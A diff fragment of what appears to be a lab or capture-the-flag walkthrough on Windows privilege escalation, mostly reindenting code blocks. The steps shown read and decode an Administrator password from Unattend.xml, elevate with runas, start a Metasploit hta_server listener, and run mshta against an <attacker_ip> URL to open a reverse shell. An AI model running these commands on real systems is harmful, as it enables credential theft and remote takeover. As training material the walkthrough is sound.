@@ -347,28 +347,27 @@ hashdump
    ```
    
 2. Read and decode the password securely (redacted here):
-   ```powershell
+  ```powershell
   cat C:\Windows\Panther\Unattend.xml
   $password = '<base64_string>'
   $password = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
   ```
 
 3. Use runas to elevate to Administrator (use the decoded password):
-
-   ```cmd
+  ```cmd
   runas.exe /user:Administrator cmd
   whoami
   ```
-4. On the attacker machine, run:
 
-   ```bash
+4. On the attacker machine, run:
+  ```bash
   msfconsole -q
   use exploit/windows/misc/hta_server
   set LHOST <attacker_ip>
   exploit
   ```
 5. Back on the target, trigger the reverse shell:
-   ```cmd
+  ```cmd
   mshta.exe http://<attacker_ip>:8080/<payload>.hta
   ```
 
